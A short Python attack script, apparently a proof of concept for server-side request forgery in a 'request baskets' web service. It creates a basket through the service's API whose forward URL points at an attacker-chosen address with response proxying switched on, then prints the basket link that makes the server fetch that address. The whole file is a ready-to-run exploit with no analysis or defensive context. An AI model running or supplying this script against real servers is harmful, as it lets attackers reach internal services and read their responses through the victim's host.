#!/usr/bin/python3

import sys, random, string, argparse, json, requests, signal

def handler(sig, frame):
    print("\n\n[i] EXITING\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler) 

def getARG():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--t",dest="url",help="Basket URL")
    parser.add_argument("-e","--e",dest="evil",help="URL to put")
    opts = parser.parse_args()
    if not opts.url:
        print("[-] Please add the target URL")
        exit(1)
    if not opts.evil:
        print("[-] Please add the URL to put")
        exit(1)
    return opts

def generate_random_string(length=6):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def send(url, evil):
    options = {
        "forward_url":evil,
        "proxy_response":True,
        "insecure_tls":False,
        "expand_path":True,
        "capacity":250
    }
    response=requests.post(url,json=options,headers={'Content-Type': 'application/json'})
    if response.status_code != 201:
        print("[-] Bad response, status code = ",response.status_code)
        handler(signal.SIGINT, handler)
    return response

def urlchk(url):
    if not url.endswith('/'):
        url += '/'
    return url

opt=getARG()
url=urlchk(opt.url)
evil=opt.evil
basket=generate_random_string()
api=url+"api/baskets/"+basket
resp=send(api,evil)
full=url+basket
print("[+] DONE!, now enter "+full)
print("[+] GOT RESPONSE:\n"+resp.text)
